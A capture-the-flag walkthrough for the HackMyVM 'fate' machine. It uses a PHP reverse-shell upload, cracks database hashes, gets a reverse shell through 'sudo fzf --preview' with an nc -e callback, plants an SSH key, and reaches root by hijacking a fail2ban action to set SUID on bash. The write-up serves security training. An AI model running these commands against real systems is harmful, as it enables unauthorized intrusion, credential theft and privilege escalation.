### Write up for https://hackmyvm.eu/machines/machine.php?vm=fate ###

## Walkthrough



```bash
ip=[targetIP]
threader3000
```

```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:39:bc:89:db:98:a7:63:15:fe:13:54:01:22:8d:52 (RSA)
|   256 bb:a3:b7:24:76:9c:fd:27:8f:13:ef:f5:cf:4f:8b:ab (ECDSA)
|_  256 0c:af:8b:a0:fa:3f:7b:38:52:b4:93:a0:65:da:c0:7c (ED25519)
80/tcp    open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Site doesn't have a title (text/html).
13120/tcp open  http    Node.js Express framework
|_http-title: Gancio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```bash
feroxbuster -n -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $url -x php,txt,html,zip,bak,htm,cgi -t 500 -e
```

301      GET        7l       11w      169c http://$ip/uploads => http://$ip/uploads/
```text
200      GET       12l       27w      285c http://$ip/index.html
200      GET        1l        8w        0c http://$ip/upload.php
200      GET       12l       27w      285c http://$ip/
```

Visit $url
we see that we can upload file
lets try php-reverse-shell

```bash
nc -lvnp [port]
```

The file revsh.php has been uploaded and renamed to db405464322afaa2bd0fd784b91011b6

```bash
$url/uploads/ ----> 403
```

```bash
curl $url/uploads/db405464322afaa2bd0fd784b91011b6
```
<?php
php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Copyright (C) 2007 pentestmonkey@pentestmonkey.net

after a lot of struggling 

trying both the normal name and the renamed one

i tried to upload a new file but run a backround script before uploading
(rename your php-revshell)

while [[ "$(curl -s -o /dev/null -w ''%{http_code}'' http://$ip/uploads/rev.php)" != "200" ]]; do sleep 5; done

```bash
nc -lvnp [port]
```

we got shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

ctrl+z

```bash
stty -a; stty raw -echo;fg
export SHELL=bash
export TERM=xterm
stty rows (values from stty -a) cols (values from stty -a)
```


```bash
find / -perm -u=s 2>/dev/null
getcap -r / 2>/dev/null
```

nothing special

its linpeas time

```bash
python3 -m http.server 80
```

```bash
cd /tmp
wget <ourip>/linpeas.sh
chmod +x linpeas.sh
```
./linpeas.sh

gancio       624  0.1 16.7 946532 167428 ?       Ssl  17:10   0:09 node /usr/local/bin/gancio
```bash
/etc/systemd/system/gancio.service is executing some relative path
/etc/systemd/system/multi-user.target.wants/gancio.service is executing some relative path
```
```text
uid=107(gancio) gid=113(gancio) groups=113(gancio)
drwxr-xr-x  4 gancio gancio 4096 Feb 16 10:51 gancio
-rw-r--r-- 1 gancio gancio 1282 Apr  3 17:10 /tmp/node-jiti/server-initialize.server.js.c8d34e02.js
```


```bash
find / -iname gancio 2>/dev/null
```

```bash
/var/lib/mysql/gancio
```
/usr/local/bin/gancio
/usr/local/share/.config/yarn/global/node_modules/gancio
/usr/local/share/.config/yarn/global/node_modules/.bin/gancio
/usr/local/share/.cache/yarn/v6/npm-gancio-1.4.0-a5c1a777ef5121604ff781af17417f88e64f3191/node_modules/gancio
/usr/local/share/.cache/yarn/v6/npm-gancio-1.4.0-a5c1a777ef5121604ff781af17417f88e64f3191/node_modules/gancio/.bin/gancio
/usr/local/share/.cache/yarn/v6/.tmp/01e94e889254727c8b933650006ea644/.bin/gancio
/opt/gancio

```bash
cd /opt/gancio
ls -alh
```
```text
total 20K
drwxr-xr-x 4 gancio gancio 4.0K Feb 16 10:51 .
drwxr-xr-x 3 root   root   4.0K Feb 16 10:40 ..
-rw-r--r-- 1 gancio gancio  474 Feb 16 10:51 config.json
drwxr-xr-x 2 gancio gancio 4.0K Apr  3 17:10 logs
drwxr-xr-x 3 gancio gancio 4.0K Feb 16 10:51 uploads
```


```bash
cat config.json
```

"log_level": "debug",
  "log_path": "/opt/gancio/logs",
  "db": {
    "dialect": "mariadb",
    "storage": "",
    "host": "localhost",
    "database": "gancio",
    "username": "******",
    "password": "******",
    "logging": false,
    "dialectOptions": {
      "autoJsonMap": false

mysql -u[username] -p[password]
show databases;
use gancio
show tables;
select * from users;

get two hashes

exit

```bash
pico hashes
```
add the two hashes

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

you will get only connor's pass

```bash
ssh connor@$ip
```

```bash
sudo -l
```
```text
Matching Defaults entries for connor on fate:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
```

```text
User connor may run the following commands on fate:
    (john) NOPASSWD: /usr/bin/fzf
```

lets check gtfobins
nothing

```bash
sudo -u john /usr/bin/fzf --help
```

```bash
sudo -u john /usr/bin/fzf --preview 'nc <yourip> 1234 -e /bin/bash'
```

```bash
nc -lvnp 1234                 
```

```text
listening on [any] 1234 ...
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.6] 58448
id
uid=1001(john) gid=1001(john) groups=1001(john)
```

```bash
cd 
mkdir .ssh
chmod 755 .ssh
cd .ssh
echo "your id_ssh.pub" >> authorized_keys
chmod 655 authorized_keys
```
exit

```bash
ssh john@$ip
```

```bash
ls
cat user.txt
```

```bash
sudo -l 
```
```text
User john may run the following commands on fate:
    (root) NOPASSWD: /usr/bin/systemctl restart fail2ban
```

After some google search i found 2 ways

```bash
/etc/fail2ban/action.d/iptables-multiport.conf
```
and 
```bash
/etc/fail2ban/action.d/iptables-common.conf
```

The first one didnt work for me.

```bash
cd /tmp
echo "chmod +s /bin/bash" > iptables
chmod +x iptables
```

```bash
ls -alh /bin/bash
```
```text
-rwxr-xr-x 1 root root 1.2M Aug  4  2021 /bin/bash
```

```bash
pico /etc/fail2ban/action.d/iptables-common.conf
```

# Option:  iptables
# Notes.:  Actual command to be executed, including common to all calls options
# Values:  STRING
iptables = iptables <lockingopt>
change to 
iptables = /tmp/iptables <lockingopt>

save and close

```bash
watch -n 0 ls -alh /bin/bash
```

open a new terminal and ssh john2@$ip
try few times and you will see 

```text
-rwsr-sr-x 1 root root 1.2M Aug  4  2021 /bin/bash
```

```bash
john@fate:/tmp$ /bin/bash -p
```
```text
bash-5.1# 
```
```bash
ls /root
```

```bash
cat /root/root.txt
```
